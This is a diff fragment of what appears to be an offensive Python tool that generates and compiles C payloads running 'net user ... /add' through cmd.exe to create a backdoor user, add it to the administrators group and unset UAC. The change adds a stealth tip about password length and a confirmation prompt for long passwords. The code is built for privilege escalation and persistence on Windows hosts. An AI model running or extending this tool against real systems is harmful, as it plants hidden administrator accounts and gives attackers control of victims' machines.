@@ -25,7 +25,7 @@ ______ _ _                                   _
 
 parser.add_argument('--action',nargs='+',choices=['create_user','add_to_group','unset_uac'],help="Main action")
 parser.add_argument('--username','-u',default="hoppy",help="Your username")
-parser.add_argument('--password','-p',default='H0pBreWedW1thl0v3',help="Your password matching the rules")
+parser.add_argument('--password','-p',default='H0pBreWedW1thl0v3',help="Your password matching the rules <14 char is more sleath")
 parser.add_argument('--group','-g',default='administrators',help="The group, tips for FR it's Administrateur")
 parser.add_argument('--wrapper','-w',default='system("cmd.exe /c INJECT_HERE");',help="A command wrapper")
 parser.add_argument('--compiler','-c',default='x86_64-w64-mingw32-gcc',help="A C compiler : 'i686-w64-mingw32-gcc -lnetapi32' is an option")
@@ -43,6 +43,10 @@ for action in args.action:
     if(action=='create_user'):
         username=args.username
         password=args.password
+        if(len(password)>=14):
+            answer = input("Are you sure to use a "+ str(len(password))+ " chars password ?\nUsing a more than 14 will prompt the user to confirm and my not work automatically. \n(y/yes to  confirm)")
+            if not answer.lower() in ["y","yes"]:
+                sys.exit(-1)
         wrapper=args.wrapper
         adduser="net user %s %s /add"%(username,password)
         cmd=wrapper.replace('INJECT_HERE',adduser)
